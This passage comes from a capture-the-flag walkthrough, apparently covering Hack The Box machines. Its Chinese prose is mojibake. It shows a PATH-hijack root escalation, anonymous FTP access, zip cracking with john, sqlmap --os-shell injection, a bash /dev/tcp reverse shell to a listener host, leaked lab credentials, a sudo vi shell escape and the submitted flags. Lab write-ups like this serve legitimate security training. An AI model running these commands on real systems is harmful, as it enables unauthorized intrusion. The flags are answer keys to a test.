å‘½ä»¤ï¼Œæ‰€ä»¥å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ cat å‘½ä»¤ï¼Œå¹¶ä¿®æ”¹å½“å‰ç”¨æˆ·ç¯å¢ƒå˜é‡ï¼Œå°†æƒé™æå‡ä¸º root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span>//å°†/tmpç›®å½•è®¾ç½®ä¸ºç¯å¢ƒå˜é‡<br><span class="hljs-built_in">cd</span> /tmp///åˆ‡æ¢åˆ°/tmpç›®å½•ä¸‹<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> &gt; <span class="hljs-built_in">cat</span>//æ„é€ æ¶æ„çš„<span class="hljs-built_in">cat</span>å‘½ä»¤<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>//èµ‹äºˆæƒé™<br></code></pre></td></tr></table></figure><p><code>bugtracker</code> è°ƒç”¨ cat å‘½ä»¤æ—¶å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ &#96;&#96;&#x2F;tmp&#96; ç›®å½•ä¸‹çš„æ¶æ„çš„ cat å‘½ä»¤ï¼Œæ­¤æ—¶ robert ç”¨æˆ·ä¸´æ—¶å…·æœ‰äº†root æƒé™ï¼Œuid å˜æˆäº†rootï¼Œä½†ä¸æ˜¯ root ç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/ff0ea81990e4297c.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:af13b0bee69f8a877c3faf667f7beacf<br></code></pre></td></tr></table></figure><h2 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h2><h3 id="Task-1-7"><a href="#Task-1-7" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs less">â””â”€# <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sS</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-Pn</span> <span class="hljs-number">10.129</span><span class="hljs-selector-class">.69</span><span class="hljs-selector-class">.163</span><br><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.94S</span><span class="hljs-selector-tag">VN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-03-05 00:23 CST</span><br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">69.163</span><br>Host is up (<span class="hljs-number">1.9s</span> latency).<br><span class="hljs-keyword">Not</span> <span class="hljs-attribute">shown</span>: <span class="hljs-number">997</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br>| <span class="hljs-attribute">ftp-syst</span>:<br>|   <span class="hljs-attribute">STAT</span>:<br>| FTP server <span class="hljs-attribute">status</span>:<br>|      Connected <span class="hljs-attribute">to </span>::<span class="hljs-attribute">ffff</span>:<span class="hljs-number">10.10</span>.<span class="hljs-number">16.36</span><br>|      Logged in as ftpuser<br>|      <span class="hljs-attribute">TYPE</span>: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is <span class="hljs-number">300</span><br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was <span class="hljs-number">1</span><br>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable<br>|_End of status<br>| <span class="hljs-attribute">ftp-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br>|_-rwxr-xr-x    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">2533</span> Apr <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> backup.zip<br><span class="hljs-number">22</span>/tcp open  ssh<br>| <span class="hljs-attribute">ssh-hostkey</span>:<br>|   <span class="hljs-number">3072</span> <span class="hljs-attribute">c0</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">58</span>:<span class="hljs-number">07</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:<span class="hljs-attribute">b0</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">91</span>:<span class="hljs-number">65</span>:<span class="hljs-attribute">b2</span>:<span class="hljs-number">59</span>:<span class="hljs-number">56</span>:<span class="hljs-number">95</span>:<span class="hljs-number">27</span>:a4 (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-attribute">ac</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">81</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:<span class="hljs-number">22</span>:<span class="hljs-attribute">d7</span>:<span class="hljs-attribute">a7</span>:<span class="hljs-number">41</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">81</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">b8</span>:<span class="hljs-attribute">b2</span>:<span class="hljs-number">51</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c3</span>:<span class="hljs-number">21</span>:<span class="hljs-attribute">df</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-attribute">a2</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c9</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">03</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">69</span>:<span class="hljs-attribute">d0</span>:<span class="hljs-number">28</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http<br>| <span class="hljs-attribute">http-cookie-flags</span>:<br>|   /:<br>|     <span class="hljs-attribute">PHPSESSID</span>:<br>|_      httponly flag <span class="hljs-keyword">not</span> set<br>|<span class="hljs-attribute">_http-title</span>: MegaCorp Login<br><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">97.70</span> seconds<br></code></pre></td></tr></table></figure><p>21 FTPã€22 SSHã€80 HTTP</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Besides SSH <span class="hljs-keyword">and</span> HTTP, what other service <span class="hljs-keyword">is</span> hosted <span class="hljs-keyword">on</span> <span class="hljs-keyword">this</span> box?<br>:FTP<br></code></pre></td></tr></table></figure><h3 id="Task-2-7"><a href="#Task-2-7" class="headerlink" title="Task 2"></a>Task 2</h3><p>FTP çš„åŒ¿åç™»å½•</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">anonymous:</span>anonymous<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">This service can be configured <span class="hljs-keyword">to</span> allow <span class="hljs-keyword">login</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> specific username. What <span class="hljs-keyword">is</span> that username?<br>:anonymous<br></code></pre></td></tr></table></figure><h3 id="Task-3-7"><a href="#Task-3-7" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">ftp&gt; ls<br>229 Entering Extended Passive Mode (|||10202|)<br>150 Here comes the directory listing.<br>-rwxr-xr-x   <span class="hljs-number"> 1 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 2533 </span>Apr<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>backup.zip<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> downloaded <span class="hljs-keyword">over</span> this service?<br>:backup.zip<br></code></pre></td></tr></table></figure><h3 id="Task-4-7"><a href="#Task-4-7" class="headerlink" title="Task 4"></a>Task 4</h3><p>ä½¿ç”¨ john  çˆ†ç ´</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">zip2john backup.zip &gt; crack<br><br>john -wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt crack<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8464f657edc85e83.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What script comes <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> John The Ripper toolset <span class="hljs-keyword">and</span> generates <span class="hljs-keyword">a</span> hash <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> password protected zip archive <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">format</span> <span class="hljs-built_in">to</span> allow <span class="hljs-keyword">for</span> cracking attempts?<br>:zip2john<br></code></pre></td></tr></table></figure><h3 id="Task-5-7"><a href="#Task-5-7" class="headerlink" title="Task 5"></a>Task 5</h3><p>è§£å‹ zip æ–‡ä»¶</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">unzip backup.zip<br>å¯†ç :<span class="hljs-number">741852963</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/981dbec569bd6475.png"></p><p>æ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>qwerty789<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5837ad06765b5e8c.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">admin</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">on</span> the website?<br>:qwerty789<br></code></pre></td></tr></table></figure><h3 id="Task-6-7"><a href="#Task-6-7" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">What option can <span class="hljs-keyword">be</span> passed <span class="hljs-keyword">to</span> sqlmap <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span> execution via the sql injection?<br>:--os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h3 id="Task-7-7"><a href="#Task-7-7" class="headerlink" title="Task 7"></a>Task 7</h3><p>è¿›å…¥ç½‘ç«™å‘ç°å­˜åœ¨ sql æ³¨å…¥ç‚¹ï¼Œsqlmap è·‘ä¸€ä¸‹ï¼Œè·‘çš„è¶…çº§æ…¢</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u http://<span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">34</span>.<span class="hljs-number">175</span>/dashboard.php?search=Pico --cookie=&quot;PHPSESSID=<span class="hljs-number">9</span>ak49pbfau0kfkh436vo92tft0&quot; --os-shell --batch<br></code></pre></td></tr></table></figure><p>åå¼¹ä¸€ä¸ª shell å»ç›‘å¬</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &amp;&gt; /dev/tcp/10.10.16.36/1234 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>/var/www/html</code> ç›®å½•ä¸‹çš„ <code>dashboard.php</code> ä¸­æ‰¾åˆ°å¯†ç  <code>P@s5w0rd!</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">postgres:<span class="hljs-symbol">P@</span>s5w0rd!<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ebc018fcbb5f0b51.png"></p><p>å¯ä»¥çœ‹è§ <code>(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code>ï¼Œè¯´æ˜å¯ä»¥ä»¥ root è¿è¡Œ <code>vi</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">What program can the postgres <span class="hljs-keyword">user</span> <span class="hljs-title">run</span> as root using sudo?<br>:vi<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-9"><a href="#Submit-Flag-9" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><img src="https://img.dkdun.cn/v1/2025/12/bf7f08bde67594a7.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:ec9b13ca4d6229cd5cc1e09980965bf7<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-10"><a href="#Submit-Flag-10" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>æ‰§è¡Œä»¥ root æƒé™æ‰“å¼€ vi</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf<br></code></pre></td></tr></table></figure><p>ä¹‹åè¾“å…¥</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">:!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>å› ä¸ºåœ¨ vi çš„å‘½ä»¤æ¨¡å¼ä¸‹ï¼Œè¾“å…¥ <code>!</code> ä»£è¡¨å¼ºåˆ¶æ‰§è¡Œï¼Œæ¯”å¦‚è¾“å…¥çš„ <code>!/bin/sh</code>ï¼Œå°±ä»£è¡¨ä»¥ shell æ‰§è¡Œ <code>/bin/sh</code> </p><p>ç„¶åå°±æˆåŠŸæå‡åˆ° root æƒé™</p><p><img src="https://img.dkdun.cn/v1/2025/12/cab4adb88af9b153.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:dd6e058e814260bc70e9bbdef2715849<br></code></pre></td></tr></table></figure><h2 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h2><h3 id="Task-1-8"><a href="#Task-1-8" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs wren"> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">sS</span> <span class="hljs-operator">-</span><span class="hljs-variable">sV</span> <span class="hljs-number">10.129</span><span class="hljs-number">.119</span><span class="hljs-number">.72</span><br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span>SVN ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-03-05 19:38 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.119</span><span class="hljs-number">.72</span><br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.43</span>s <span class="hljs-variable">latency</span>).<br><span class="hljs-title class_">Not</span> <span class="hljs-variable">shown</span>: <span class="hljs-number">996</span> <span class="hljs-variable">closed</span> <span class="hljs-variable">tcp</span> <span class="hljs-title function_">ports</span> (<span class="hljs-variable">reset</span>)<br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>         <span class="hljs-variable">VERSION</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>             <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.2</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">6789</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ibm</span><span class="hljs-operator">-</span><span class="hljs-variable">db2</span><span class="hljs-operator">-</span><span class="hljs-variable">admin?</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-number">8443</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ssl</span>/<span class="hljs-variable">nagios</span><span class="hljs-operator">-</span><span class="hljs-variable">nsca</span> <span class="hljs-title class_">Nagios</span> <span class="hljs-variable">NSCA</span><br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>8080<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.94</span>SVN<span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>/<span class="hljs-number">5</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">67</span>C837E3<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">GetRequest</span>,<span class="hljs-number">84</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>302<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Location:<span class="hljs-char escape_">\x20</span>http://localhost:80</span><br><span class="hljs-string">SF:80/manage<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>11:39:15<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">84</span>,<br><span class="hljs-variable">SF</span>:<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>302<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Location:<span class="hljs-char escape_">\x20</span>http://localhost:8080/manage<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>C</span><br><span class="hljs-string">SF:ontent-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025<span class="hljs-char escape_">\x20</span>11:39:16\x</span><br><span class="hljs-string">SF:20GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">24</span>E,<span class="hljs-string">&quot;HTTP/1\.1\x2</span><br><span class="hljs-string">SF:0400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Languag</span><br><span class="hljs-string">SF:e:<span class="hljs-char escape_">\x20</span>en<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>435<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>202</span><br><span class="hljs-string">SF:5<span class="hljs-char escape_">\x20</span>11:39:19<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>html&gt;&lt;</span><br><span class="hljs-string">SF:html<span class="hljs-char escape_">\x20</span>lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span>\</span><br><span class="hljs-string">SF:x20Bad<span class="hljs-char escape_">\x20</span>Request&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-fami</span><br><span class="hljs-string">SF:ly:Tahoma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:white;</span><br><span class="hljs-string">SF:background-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-si</span><br><span class="hljs-string">SF:ze:16px;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a<span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&#123;color:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;border</span><br><span class="hljs-string">SF::none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span>\x</span><br><span class="hljs-string">SF:20Bad<span class="hljs-char escape_">\x20</span>Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-number">24</span>A,<span class="hljs-string">&quot;HTTP/1\.</span><br><span class="hljs-string">SF:1<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Lan</span><br><span class="hljs-string">SF:guage:<span class="hljs-char escape_">\x20</span>en<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>431<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar\x2</span><br><span class="hljs-string">SF:02025<span class="hljs-char escape_">\x20</span>11:39:22<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span 